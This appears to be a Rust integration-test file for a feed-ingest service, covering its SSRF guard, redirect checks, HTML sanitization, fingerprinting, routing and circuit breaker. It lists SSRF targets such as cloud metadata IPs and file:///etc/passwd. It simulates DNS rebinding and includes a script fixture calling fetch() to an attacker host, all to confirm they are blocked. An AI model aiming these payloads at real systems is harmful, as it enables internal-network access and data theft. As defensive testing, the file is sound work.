//! Comprehensive Wave 2a integration tests for `feedcourier::net` (connect-time SSRF guard,
//! hop-by-hop redirect validation, streaming byte caps, hot-reloaded allowlists, proxy guards)
//! and `feedcourier::ingest` (4-tier fingerprinting, relative URL resolution, `ammonia`
//! sanitization, Unicode first-sentence extraction, Readability + fallback, `silent_init`,
//! route/content filtering, `304 Not Modified`, `Retry-After` backoff, 15-failure `circuit_open`,
//! live feed preview, and nested OPML 2.0 import/export).

use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;

use feedcourier::channels::{ChannelKind, RouteOptions};
use feedcourier::db::Database;
use feedcourier::db::models::{
    DeliveryTaskStatus, FeedHealthStatus, NewChannel, NewFeed, NewRoute, now_unix,
};
use feedcourier::error::AppError;
use feedcourier::ingest::{
    ContentFilterRules, FingerprintInput, FingerprintTier, IngestEngine, compute_entry_fingerprint,
    extract_first_sentence, normalize_canonical_url, parse_feed_bytes, parse_opml,
    sanitize_and_extract_html,
};
use feedcourier::net::{NetSettings, OutboundRequest, ProtectedHttpClient};
use tempfile::TempDir;
use url::Url;
use wiremock::matchers::{header, header_exists, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

async fn open_test_db() -> (TempDir, Database) {
    let dir = tempfile::tempdir().expect("create tempdir");
    let db_path = dir.path().join("feedcourier_test.db");
    let db = Database::connect(&db_path, 4)
        .await
        .expect("connect and migrate SQLite test DB");
    (dir, db)
}

fn loopback_allowlisted_client() -> ProtectedHttpClient {
    ProtectedHttpClient::new(NetSettings {
        outbound_proxy_url: None,
        ssrf_allowlist: vec!["127.0.0.1/32".to_string()],
    })
    .expect("build loopback-allowlisted ProtectedHttpClient")
}

// ============================================================================
// 1. Outbound Networking, SSRF Guard, Redirects & Byte Caps
// ============================================================================

#[tokio::test]
async fn ssrf_blocks_loopback_private_metadata_and_schemes_by_default() {
    let client = ProtectedHttpClient::with_defaults();

    let blocked_targets = [
        "http://127.0.0.1:8080/feed.xml",
        "http://[::1]:8080/feed.xml",
        "http://0.0.0.0/feed.xml",
        "http://169.254.169.254/latest/meta-data/",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://10.0.0.42/rss.xml",
        "http://172.16.31.5/rss.xml",
        "http://192.168.1.100/rss.xml",
        "http://100.64.10.20/rss.xml",
        "http://[fc00::1234]/rss.xml",
        "http://[fe80::1]/rss.xml",
        "http://[::ffff:127.0.0.1]/rss.xml",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "file:///etc/passwd",
        "ftp://example.com/pub/feed.xml",
        "gopher://127.0.0.1:70/_",
    ];

    for target in blocked_targets {
        let err = client
            .get_bytes(OutboundRequest::new(target))
            .await
            .expect_err(&format!("expected SSRF guard to block '{target}'"));
        assert!(
            matches!(err, AppError::SsrfBlocked(_)),
            "expected AppError::SsrfBlocked for '{target}', got: {err:?}"
        );
    }
}

#[tokio::test]
async fn ssrf_allowlist_hot_reload_and_open_redirect_to_metadata_blocked() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/ok.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .set_body_string("<rss version=\"2.0\"><channel><title>OK</title></channel></rss>"),
        )
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/redirect-metadata"))
        .respond_with(
            ResponseTemplate::new(302)
                .insert_header("Location", "http://169.254.169.254/latest/meta-data/iam/"),
        )
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/sub/relative-redirect"))
        .respond_with(ResponseTemplate::new(301).insert_header("Location", "../ok.xml"))
        .mount(&server)
        .await;

    // 1. Blocked before allowlisting 127.0.0.1/32.
    let client = ProtectedHttpClient::with_defaults();
    let blocked = client
        .get_bytes(OutboundRequest::new(format!("{}/ok.xml", server.uri())))
        .await
        .expect_err("127.0.0.1 must be blocked by default");
    assert!(matches!(blocked, AppError::SsrfBlocked(_)));

    // 2. Hot-reload `ssrf_allowlist` at runtime without recreating `ProtectedHttpClient`.
    client
        .update_settings(NetSettings {
            outbound_proxy_url: None,
            ssrf_allowlist: vec!["127.0.0.1/32".to_string()],
        })
        .expect("hot-reload NetSettings");

    let ok_resp = client
        .get_bytes(OutboundRequest::new(format!("{}/ok.xml", server.uri())))
        .await
        .expect("allowlisted wiremock must succeed");
    assert_eq!(ok_resp.status.as_u16(), 200);
    assert!(ok_resp.bytes.starts_with(b"<rss"));

    // 3. Relative 301 redirect inside allowlisted host resolves and succeeds.
    let rel_resp = client
        .get_bytes(OutboundRequest::new(format!(
            "{}/sub/relative-redirect",
            server.uri()
        )))
        .await
        .expect("relative redirect to allowlisted target must succeed");
    assert_eq!(rel_resp.status.as_u16(), 200);
    assert_eq!(rel_resp.final_url.path(), "/ok.xml");

    // 4. Open 302 redirect from allowlisted `127.0.0.1` to cloud metadata `169.254.169.254` MUST fail!
    let redirect_err = client
        .get_bytes(OutboundRequest::new(format!(
            "{}/redirect-metadata",
            server.uri()
        )))
        .await
        .expect_err("open redirect to 169.254.169.254 must be blocked on hop 1");
    assert!(
        matches!(redirect_err, AppError::SsrfBlocked(_)),
        "expected SsrfBlocked on metadata redirect, got: {redirect_err:?}"
    );

    // 5. Even if an admin accidentally allowlists `169.254.0.0/16` or bare `169.254.169.254`,
    // cloud metadata remains locked out unless exact `169.254.169.254/32` is listed.
    client
        .update_settings(NetSettings {
            outbound_proxy_url: None,
            ssrf_allowlist: vec!["169.254.0.0/16".to_string(), "169.254.169.254".to_string()],
        })
        .expect("update settings with broad link-local CIDR");
    let still_blocked = client
        .get_bytes(OutboundRequest::new(
            "http://169.254.169.254/latest/meta-data/",
        ))
        .await
        .expect_err("169.254.169.254 must still be blocked without explicit /32");
    assert!(matches!(still_blocked, AppError::SsrfBlocked(_)));
}

#[tokio::test]
async fn ssrf_defeats_dns_rebinding_and_enforces_socks5h_guards() {
    let lookup = Arc::new(|host: String| {
        Box::pin(async move {
            match host.as_str() {
                // Multi-record DNS rebinding response mixing a public IP and an internal RFC1918 IP.
                "rebind.attacker.example" => Ok(vec![
                    IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34)),
                    IpAddr::V4(Ipv4Addr::new(10, 0, 0, 99)),
                ]),
                // Wildcard-allowlisted internal hostname resolving to cloud metadata IP!
                "imds.lan" => Ok(vec![IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254))]),
                // Legitimate self-hosted RSSHub on `.lan` resolving to RFC1918.
                "rsshub.lan" => Ok(vec![IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))]),
                _ => Err("nxdomain".to_string()),
            }
        })
            as std::pin::Pin<
                Box<dyn std::future::Future<Output = Result<Vec<IpAddr>, String>> + Send>,
            >
    });

    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/rss"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&server)
        .await;
    let port = server.address().port();

    let client = ProtectedHttpClient::with_custom_dns(
        NetSettings {
            outbound_proxy_url: Some("socks5h://127.0.0.1:1080".to_string()),
            ssrf_allowlist: vec!["*.lan".to_string()],
        },
        lookup,
    )
    .expect("build ProtectedHttpClient with custom DNS");

    // 1. DNS rebinding (`rebind.attacker.example` -> public + 10.0.0.99) blocked at connect time!
    let rebind_err = client
        .get_bytes(OutboundRequest::new(format!(
            "http://rebind.attacker.example:{port}/rss"
        )))
        .await
        .expect_err("DNS rebinding with private IP must fail");
    assert!(matches!(rebind_err, AppError::SsrfBlocked(_)));

    // 2. Wildcard `*.lan` hostname resolving to `169.254.169.254` STILL blocked!
    let imds_err = client
        .get_bytes(OutboundRequest::new(format!("http://imds.lan:{port}/rss")))
        .await
        .expect_err("cloud metadata IP behind allowlisted hostname must still fail");
    assert!(matches!(imds_err, AppError::SsrfBlocked(_)));

    // 3. Wildcard `*.lan` hostname resolving to internal IP (`127.0.0.1`) succeeds!
    let lan_ok = client
        .get_bytes(OutboundRequest::new(format!(
            "http://rsshub.lan:{port}/rss"
        )))
        .await
        .expect("wildcard *.lan internal host must be permitted");
    assert_eq!(&lan_ok.bytes[..], b"ok");

    // 4. Even with `use_proxy = true` (`socks5h://`), literal private/metadata IPs and `localhost`
    // are blocked before touching the SOCKS5 proxy!
    for bad_proxied in [
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1/admin",
        "http://localhost:8080/internal",
        "javascript:alert(1)",
    ] {
        let err = client
            .get_bytes(OutboundRequest::new(bad_proxied).use_proxy(true))
            .await
            .expect_err("socks5h hop validation must block private/metadata targets");
        assert!(matches!(
            err,
            AppError::SsrfBlocked(_) | AppError::Validation(_)
        ));
    }
}

#[tokio::test]
async fn streaming_byte_cap_aborts_oversized_responses() {
    let server = MockServer::start().await;

    let big_payload = "x".repeat(8 * 1024);
    Mock::given(method("GET"))
        .and(path("/oversized"))
        .respond_with(ResponseTemplate::new(200).set_body_string(big_payload))
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/within-cap"))
        .respond_with(ResponseTemplate::new(200).set_body_string("hello world"))
        .mount(&server)
        .await;

    let client = loopback_allowlisted_client();

    let err = client
        .get_bytes(OutboundRequest::new(format!("{}/oversized", server.uri())).max_bytes(1024))
        .await
        .expect_err("response exceeding max_bytes must abort");
    assert!(
        matches!(&err, AppError::Upstream(msg) if msg.contains("exceed")),
        "expected size-cap Upstream error, got: {err:?}"
    );

    let ok = client
        .get_bytes(OutboundRequest::new(format!("{}/within-cap", server.uri())).max_bytes(1024))
        .await
        .expect("small response within cap must succeed");
    assert_eq!(&ok.bytes[..], b"hello world");
}

// ============================================================================
// 2. 4-Tier Anti-Drift Fingerprinting & HTML Sanitization / First Sentence
// ============================================================================

#[test]
fn four_tier_fingerprinting_stability_and_anti_drift() {
    let base = Url::parse("https://news.example.com/feed.xml").unwrap();

    // Tier 2 URL normalization: tracking params stripped, meaningful `?id=42` preserved & sorted.
    let url_dirty = normalize_canonical_url(
        "https://news.example.com/item?utm_source=rss&b=2&id=42&fbclid=IwAR123&a=1&spm=a2c.1#comments",
        Some(&base),
    )
    .unwrap();
    let url_clean =
        normalize_canonical_url("https://news.example.com/item?a=1&b=2&id=42", Some(&base))
            .unwrap();
    let url_other =
        normalize_canonical_url("https://news.example.com/item?a=1&b=2&id=43", Some(&base))
            .unwrap();

    assert_eq!(url_dirty, "https://news.example.com/item?a=1&b=2&id=42");
    assert_eq!(url_dirty, url_clean);

    let (fp_url_1, tier_1) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: Some(&url_dirty),
        explicit_timestamp_unix: Some(1_700_000_000),
        title: Some("Post 42"),
        plain_body: Some("Body"),
    });
    let (fp_url_2, tier_2) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: Some(&url_clean),
        explicit_timestamp_unix: Some(1_700_099_999),
        title: Some("Edited Title"),
        plain_body: Some("Edited Body"),
    });
    let (fp_url_3, _) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: Some(&url_other),
        explicit_timestamp_unix: Some(1_700_000_000),
        title: Some("Post 42"),
        plain_body: Some("Body"),
    });
    assert_eq!(tier_1, FingerprintTier::CanonicalUrl);
    assert_eq!(tier_2, FingerprintTier::CanonicalUrl);
    assert_eq!(fp_url_1, fp_url_2);
    assert_ne!(fp_url_1, fp_url_3);

    // Tier 3 vs Tier 4: missing date MUST fall through to Tier 4 body hash (never `Utc::now()`).
    let (fp_t3, tier_t3) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: None,
        explicit_timestamp_unix: Some(1_730_000_000),
        title: Some("Release Notes"),
        plain_body: Some("Some body"),
    });
    assert_eq!(tier_t3, FingerprintTier::TitleTimestamp);

    let (fp_body_a, tier_t4_a) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: None,
        explicit_timestamp_unix: None,
        title: Some("Status Bulletin"),
        plain_body: Some("Posted 5 minutes ago — All edge nodes healthy. 刚刚更新"),
    });
    let (fp_body_b, tier_t4_b) = compute_entry_fingerprint(&FingerprintInput {
        raw_id: None,
        normalized_canonical_url: None,
        explicit_timestamp_unix: None,
        title: Some("Status   Bulletin"),
        plain_body: Some("Posted 3 hours ago — All edge nodes healthy. 2小时前更新"),
    });
    assert_eq!(tier_t4_a, FingerprintTier::NormalizedBody);
    assert_eq!(tier_t4_b, FingerprintTier::NormalizedBody);
    assert_eq!(fp_body_a, fp_body_b);
    assert_ne!(fp_t3, fp_body_a);

    // Verify `parse_feed_bytes` disables `feed-rs` random UUID synthesis on minimalist RSS items!
    let minimal_rss = br#"<?xml version="1.0" encoding="UTF-8"?>
    <rss version="2.0">
      <channel>
        <title>Minimalist Feed</title>
        <item>
          <title>No GUID, No Link, No PubDate</title>
          <description> Core announcement text that stays stable across polls. </description>
        </item>
      </channel>
    </rss>"#;
    let parsed_1 = parse_feed_bytes(minimal_rss, &base).expect("parse minimal RSS #1");
    let parsed_2 = parse_feed_bytes(minimal_rss, &base).expect("parse minimal RSS #2");
    assert!(
        parsed_1.entries[0].id.is_empty(),
        "parser must not synthesize random UUID when <guid> is absent"
    );
    assert!(parsed_1.entries[0].published.is_none());
    assert_eq!(parsed_1.entries[0].id, parsed_2.entries[0].id);
}

#[test]
fn html_relative_url_resolution_sanitization_and_unicode_first_sentence() {
    let base = Url::parse("https://blog.example.com/2026/11/deep-dive.html").unwrap();
    let dirty_html = r#"
        <p>Dr. Smith shipped FeedCourier v0.1 today. It uses SQLite WAL for speed.</p>
        <p><a href="../archive/index.html" onclick="evil()">Archive</a></p>
        <figure>
            <img src="/img/a.png" alt="Architecture diagram" onload="pwn()">
            <img data-src="charts/latency.webp" title="Latency">
            <img src="/pixel.gif" width="1" height="1">
            <img src="https://tracker.example/open.png" style="display:none">
            <figcaption>System overview</figcaption>
        </figure>
        <video poster="/media/poster.jpg" controls>
            <source src="demo.mp4" type="video/mp4">
        </video>
        <script>window.fetch('https://attacker.invalid/steal');</script>
        <iframe src="https://ads.invalid/frame"></iframe>
    "#;

    let out = sanitize_and_extract_html(dirty_html, Some(&base));

    // Relative URLs resolved against `base` BEFORE `ammonia`.
    assert!(
        out.content_html
            .contains(r#"href="https://blog.example.com/2026/archive/index.html""#),
        "expected ../archive/index.html resolved: {}",
        out.content_html
    );
    assert!(
        out.content_html
            .contains(r#"src="https://blog.example.com/img/a.png""#),
        "expected /img/a.png resolved: {}",
        out.content_html
    );
    assert!(
        out.content_html
            .contains(r#"src="https://blog.example.com/2026/11/charts/latency.webp""#),
        "expected lazy data-src promoted and resolved: {}",
        out.content_html
    );
    assert!(
        out.content_html
            .contains(r#"poster="https://blog.example.com/media/poster.jpg""#),
        "expected video poster resolved: {}",
        out.content_html
    );
    assert!(
        out.content_html
            .contains(r#"src="https://blog.example.com/2026/11/demo.mp4""#),
        "expected source src resolved: {}",
        out.content_html
    );

    // Malicious elements, inline handlers, and 1x1 / hidden tracking pixels stripped.
    assert!(!out.content_html.contains("<script"));
    assert!(!out.content_html.contains("attacker.invalid"));
    assert!(!out.content_html.contains("<iframe"));
    assert!(!out.content_html.contains("onclick"));
    assert!(!out.content_html.contains("onload"));
    assert!(!out.content_html.contains("pixel.gif"));
    assert!(!out.content_html.contains("tracker.example"));

    // Extracted inline media deduplicated and tracking pixels excluded.
    let media_urls: Vec<&str> = out.inline_media.iter().map(|m| m.url.as_str()).collect();
    assert_eq!(
        media_urls,
        vec![
            "https://blog.example.com/img/a.png",
            "https://blog.example.com/2026/11/charts/latency.webp",
            "https://blog.example.com/2026/11/demo.mp4",
        ]
    );

    // English first sentence respects common `Dr.` abbreviation and strips trailing `.`.
    assert_eq!(
        out.first_sentence.as_deref(),
        Some("Dr. Smith shipped FeedCourier v0.1 today")
    );

    // Chinese first sentence segments at `。` and strips trailing `。` cleanly.
    let cjk_first = extract_first_sentence(
        "纯血 Rust 打造的极简订阅投递网关。内置原生 MCP 协议与三大精选通道！",
    );
    assert_eq!(
        cjk_first.as_deref(),
        Some("纯血 Rust 打造的极简订阅投递网关")
    );
}

// ============================================================================
// 3. Full IngestEngine Pipeline: Silent Init, Readability, Routes, 304 & Circuit Breaker
// ============================================================================

#[tokio::test]
async fn ingest_silent_init_routing_readability_304_preview_and_circuit_breaker() {
    let (_tmp, db) = open_test_db().await;
    let server = MockServer::start().await;
    let http = loopback_allowlisted_client();
    let engine = IngestEngine::new(db.clone(), http);

    // Create an enabled Telegram channel + two enabled routes:
    // - Route 1: matches tag `"rust"` (case-insensitive) and excludes keyword `"sponsored"`.
    // - Route 2: disabled route (must never receive tasks).
    let channel = db
        .create_channel(&NewChannel {
            name: "Core Telegram".to_string(),
            kind: ChannelKind::Telegram,
            encrypted_config: vec![1, 2, 3, 4],
            credential_group_key: "tg_bot_group_1".to_string(),
            capabilities_json: r#"{"supports_rich_message":true}"#.to_string(),
            min_interval_secs: 5,
            jitter_max_secs: 2,
            hourly_quota: None,
            daily_quota: None,
            use_proxy: false,
            enabled: true,
        })
        .await
        .expect("create channel");

    let route_rust = db
        .create_route(&NewRoute {
            name: "Rust Non-Sponsored".to_string(),
            feed_ids: vec![],
            match_tags: vec!["rust".to_string()],
            channel_id: channel.id,
            include_keywords: vec![],
            exclude_keywords: vec!["sponsored".to_string()],
            include_regex: Some(r"(?i)\b(rust|cargo|tokio)\b".to_string()),
            exclude_regex: None,
            options: RouteOptions::default(),
            enabled: true,
        })
        .await
        .expect("create route_rust");

    let _route_disabled = db
        .create_route(&NewRoute {
            name: "Disabled Catch-All".to_string(),
            feed_ids: vec![],
            match_tags: vec![],
            channel_id: channel.id,
            include_keywords: vec![],
            exclude_keywords: vec![],
            include_regex: None,
            exclude_regex: None,
            options: RouteOptions::default(),
            enabled: false,
        })
        .await
        .expect("create disabled route");

    // ------------------------------------------------------------------------
    // Case A: `silent_init = true` + `push_latest_one_if_silent = false` -> 0 tasks, payloads purged
    // ------------------------------------------------------------------------
    let rss_initial = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0">
          <channel>
            <title>Rust Insider</title>
            <link>{base}</link>
            <item>
              <guid>item-3</guid>
              <title>Tokio 1.50 Released</title>
              <link>{base}/articles/3?utm_source=rss</link>
              <pubDate>Wed, 13 Nov 2026 12:00:00 GMT</pubDate>
              <description><![CDATA[<p>Short feed summary for Tokio 1.50.</p>]]></description>
            </item>
            <item>
              <guid>item-2</guid>
              <title>Cargo 1.100 Lint Guide</title>
              <link>{base}/articles/2</link>
              <pubDate>Tue, 12 Nov 2026 12:00:00 GMT</pubDate>
              <description><![CDATA[<p>Cargo workspace lint details.</p>]]></description>
            </item>
            <item>
              <guid>item-1</guid>
              <title>Rust 2024 Retrospective</title>
              <link>{base}/articles/1</link>
              <pubDate>Mon, 11 Nov 2026 12:00:00 GMT</pubDate>
              <description><![CDATA[<p>Looking back at edition 2024.</p>]]></description>
            </item>
          </channel>
        </rss>"#,
        base = server.uri()
    );

    Mock::given(method("GET"))
        .and(path("/feed-a.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .insert_header("ETag", "\"etag-a-v1\"")
                .set_body_string(rss_initial.clone()),
        )
        .mount(&server)
        .await;

    let mut new_feed_a = NewFeed::new(format!("{}/feed-a.xml", server.uri()));
    new_feed_a.tags = vec!["Rust".to_string()];
    new_feed_a.silent_init = true;
    let feed_a = db.create_feed(&new_feed_a).await.expect("create feed_a");

    let out_a = engine
        .poll_feed(feed_a.id, false, false)
        .await
        .expect("silent_init poll feed_a");
    assert_eq!(out_a.new_entries, 3);
    assert_eq!(out_a.enqueued_tasks, 0);
    assert!(!out_a.not_modified);
    assert!(!out_a.feed.silent_init, "silent_init must flip to false");
    assert_eq!(out_a.feed.title, "Rust Insider");

    let snap_after_a = db.get_overview_snapshot().await.expect("snapshot");
    assert_eq!(snap_after_a.entries_total_fingerprints, 3);
    assert_eq!(
        snap_after_a.entries_active_payloads, 0,
        "unpushed silent_init items should immediately purge transient payloads"
    );

    // ------------------------------------------------------------------------
    // Case B: `silent_init = true` + `push_latest_one_if_silent = true` + Readability + 304 + incremental poll
    // ------------------------------------------------------------------------
    let full_article_3_html = r#"<!DOCTYPE html>
    <html>
      <head>
        <title>Tokio 1.50 Released</title>
        <link rel="icon" href="/favicon.png">
      </head>
      <body>
        <nav>Top navigation noise</nav>
        <article>
          <h1>Tokio 1.50 Released</h1>
          <p>Tokio 1.50 introduces deterministic task dumps and faster io_uring timers. Benchmarks show 18% lower tail latency across production workloads.</p>
          <p>Upgrading is seamless for all Rust 2024 crates and preserves full backwards compatibility with existing Tokio runtimes.</p>
          <p><img src="/assets/tokio-bench.png" alt="Tokio benchmark"></p>
        </article>
        <footer>Footer links</footer>
      </body>
    </html>"#;

    Mock::given(method("GET"))
        .and(path("/articles/3"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "text/html; charset=utf-8")
                .set_body_string(full_article_3_html),
        )
        .mount(&server)
        .await;

    // Simulate broken Readability endpoint on `/articles/4-broken` to verify graceful fallback!
    Mock::given(method("GET"))
        .and(path("/articles/4-broken"))
        .respond_with(ResponseTemplate::new(503).set_body_string("anti-bot challenge"))
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/feed-b.xml"))
        .and(header("If-None-Match", "\"etag-b-v1\""))
        .respond_with(ResponseTemplate::new(304).insert_header("ETag", "\"etag-b-v1\""))
        .up_to_n_times(1)
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/feed-b.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .insert_header("ETag", "\"etag-b-v1\"")
                .set_body_string(rss_initial.clone()),
        )
        .up_to_n_times(1)
        .mount(&server)
        .await;

    let mut new_feed_b = NewFeed::new(format!("{}/feed-b.xml", server.uri()));
    new_feed_b.tags = vec!["RUST".to_string()];
    new_feed_b.fetch_full_content = true;
    new_feed_b.silent_init = true;
    let feed_b = db.create_feed(&new_feed_b).await.expect("create feed_b");

    // First poll with `push_latest_one_if_silent = true` -> enqueues ONLY `item-3` (the newest)!
    let out_b1 = engine
        .poll_feed(feed_b.id, false, true)
        .await
        .expect("poll feed_b silent_init with push_latest_one");
    assert_eq!(out_b1.new_entries, 3);
    assert_eq!(out_b1.enqueued_tasks, 1);
    assert!(!out_b1.feed.silent_init);
    assert_eq!(out_b1.feed.etag.as_deref(), Some("\"etag-b-v1\""));

    let entries_b = db
        .list_entries_for_feed(feed_b.id, 10)
        .await
        .expect("list entries for feed_b");
    let pushed_entry = entries_b
        .iter()
        .find(|e| !e.is_purged())
        .expect("exactly 1 newest entry should retain active payload");
    assert_eq!(pushed_entry.title.as_deref(), Some("Tokio 1.50 Released"));
    // Tracking query `?utm_source=rss` stripped on canonical_url:
    let expected_canon_3 = format!("{}/articles/3", server.uri());
    assert_eq!(
        pushed_entry.canonical_url.as_deref(),
        Some(expected_canon_3.as_str())
    );
    // Full content extracted via Readability + relative image resolved:
    let html_3 = pushed_entry.content_html.as_deref().unwrap_or("");
    assert!(
        html_3.contains("deterministic task dumps"),
        "expected Readability full text in content_html, got: {html_3}"
    );
    assert!(
        html_3.contains(&format!("{}/assets/tokio-bench.png", server.uri())),
        "expected Readability relative image resolved, got: {html_3}"
    );
    assert_eq!(
        pushed_entry.first_sentence.as_deref(),
        Some("Tokio 1.50 introduces deterministic task dumps and faster io_uring timers")
    );

    // Second poll hits `If-None-Match: "etag-b-v1"` -> `304 Not Modified`!
    let out_b2 = engine
        .poll_feed(feed_b.id, false, false)
        .await
        .expect("poll feed_b 304 Not Modified");
    assert!(out_b2.not_modified);
    assert_eq!(out_b2.new_entries, 0);
    assert_eq!(out_b2.enqueued_tasks, 0);

    // Third poll: upstream publishes 2 new items (`item-4` matching route_rust even though
    // Readability returns 503 -> falls back to feed summary!, and `item-5` excluded by `"sponsored"`).
    let rss_updated = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0">
          <channel>
            <title>Rust Insider</title>
            <link>{base}</link>
            <item>
              <guid>item-5</guid>
              <title>[Sponsored] Cloud Rust Hosting Deal</title>
              <link>{base}/articles/5</link>
              <pubDate>Thu, 14 Nov 2026 13:00:00 GMT</pubDate>
              <description><![CDATA[<p>Sponsored Rust promo post.</p>]]></description>
            </item>
            <item>
              <guid>item-4</guid>
              <title>Cargo Nextest Parallel Runner</title>
              <link>{base}/articles/4-broken</link>
              <pubDate>Thu, 14 Nov 2026 12:00:00 GMT</pubDate>
              <description><![CDATA[<p>Native RSS fallback summary for Cargo Nextest. Works even when Readability 503s.</p>]]></description>
            </item>
            <item>
              <guid>item-3</guid>
              <title>Tokio 1.50 Released (Edited Headline)</title>
              <link>{base}/articles/3</link>
              <pubDate>Wed, 13 Nov 2026 12:00:00 GMT</pubDate>
              <description><![CDATA[<p>Edited description that must be deduplicated by item-3 fingerprint.</p>]]></description>
            </item>
          </channel>
        </rss>"#,
        base = server.uri()
    );

    Mock::given(method("GET"))
        .and(path("/feed-b.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .insert_header("ETag", "\"etag-b-v2\"")
                .set_body_string(rss_updated),
        )
        .mount(&server)
        .await;

    let out_b3 = engine
        .poll_feed(feed_b.id, false, false)
        .await
        .expect("incremental normal poll feed_b");
    assert_eq!(
        out_b3.new_entries, 2,
        "item-4 and item-5 are new; item-3 deduplicated"
    );
    assert_eq!(
        out_b3.enqueued_tasks, 1,
        "only item-4 matches route_rust; item-5 excluded by 'sponsored' keyword"
    );

    // Verify both enqueued tasks in `delivery_tasks` belong to `route_rust` (`item-3` and `item-4`).
    let task_1 = db
        .claim_next_delivery_task(now_unix() + 10, 60)
        .await
        .unwrap()
        .expect("claim task 1");
    let task_2 = db
        .claim_next_delivery_task(now_unix() + 10, 60)
        .await
        .unwrap()
        .expect("claim task 2");
    assert_eq!(task_1.route_id, route_rust.id);
    assert_eq!(task_2.route_id, route_rust.id);
    assert_eq!(task_1.status, DeliveryTaskStatus::Delivering);
    let entry_for_task_2 = db.get_entry(task_2.entry_id).await.unwrap().unwrap();
    assert_eq!(
        entry_for_task_2.title.as_deref(),
        Some("Cargo Nextest Parallel Runner")
    );
    assert!(
        entry_for_task_2
            .content_html
            .as_deref()
            .unwrap_or("")
            .contains("Native RSS fallback summary"),
        "Readability 503 must gracefully fall back to RSS description"
    );

    // ------------------------------------------------------------------------
    // Case C: Live `preview_feed` with Readability + dry-run ContentFilterRules
    // ------------------------------------------------------------------------
    Mock::given(method("GET"))
        .and(path("/preview.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .set_body_string(rss_initial),
        )
        .mount(&server)
        .await;

    let preview_filter = ContentFilterRules {
        include_keywords: vec!["tokio".to_string()],
        exclude_keywords: vec![],
        include_regex: None,
        exclude_regex: None,
    };
    let preview = engine
        .preview_feed(
            &format!("{}/preview.xml", server.uri()),
            true,
            false,
            Some(&preview_filter),
        )
        .await
        .expect("preview_feed");
    assert_eq!(preview.feed_title.as_deref(), Some("Rust Insider"));
    assert_eq!(preview.items.len(), 3);
    assert!(preview.items[0].full_content_extracted);
    assert!(preview.items[0].matched_filter);
    assert!(preview.items[0].filter_reason.is_none());
    assert!(!preview.items[1].matched_filter);
    assert!(preview.items[1].filter_reason.is_some());

    // ------------------------------------------------------------------------
    // Case D: `429 Retry-After` Backoff + 15 Failures -> `circuit_open` + `reset_circuit` Recovery
    // ------------------------------------------------------------------------
    Mock::given(method("GET"))
        .and(path("/flaky.xml"))
        .respond_with(
            ResponseTemplate::new(429)
                .insert_header("Retry-After", "180")
                .set_body_string("rate limited"),
        )
        .up_to_n_times(1)
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/flaky.xml"))
        .respond_with(ResponseTemplate::new(500).set_body_string("upstream crash"))
        .up_to_n_times(14)
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/flaky.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/rss+xml")
                .set_body_string(
                    "<rss version=\"2.0\"><channel><title>Recovered Feed</title></channel></rss>",
                ),
        )
        .mount(&server)
        .await;

    let feed_flaky = db
        .create_feed(&NewFeed::new(format!("{}/flaky.xml", server.uri())))
        .await
        .expect("create flaky feed");

    // Failure #1 (`429` with `Retry-After: 180`): enters `Backoff` honoring `Retry-After`.
    let before_f1 = now_unix();
    let _ = engine
        .poll_feed(feed_flaky.id, false, false)
        .await
        .expect_err("poll #1 should fail with 429");
    let after_f1 = db.get_feed(feed_flaky.id).await.unwrap().unwrap();
    assert_eq!(after_f1.health_status, FeedHealthStatus::Backoff);
    assert_eq!(after_f1.consecutive_failures, 1);
    assert!(
        after_f1.next_poll_at.expect("backoff next_poll_at") >= before_f1 + 180,
        "429 Retry-After: 180 must schedule next_poll_at >= now + 180"
    );

    // Failures #2..=#14 stay in `Backoff`; failure #15 trips `CircuitOpen` (`next_poll_at = None`).
    for attempt in 2..=15 {
        let _ = engine
            .poll_feed(feed_flaky.id, false, false)
            .await
            .expect_err("expected upstream 500 failure");
        let row = db.get_feed(feed_flaky.id).await.unwrap().unwrap();
        assert_eq!(row.consecutive_failures, attempt);
        if attempt < 15 {
            assert_eq!(row.health_status, FeedHealthStatus::Backoff);
            assert!(row.next_poll_at.is_some());
        } else {
            assert_eq!(row.health_status, FeedHealthStatus::CircuitOpen);
            assert!(
                row.next_poll_at.is_none(),
                "circuit_open must clear next_poll_at so background loop skips until reset"
            );
            assert!(row.last_error.as_deref().unwrap_or("").contains("500"));
        }
    }

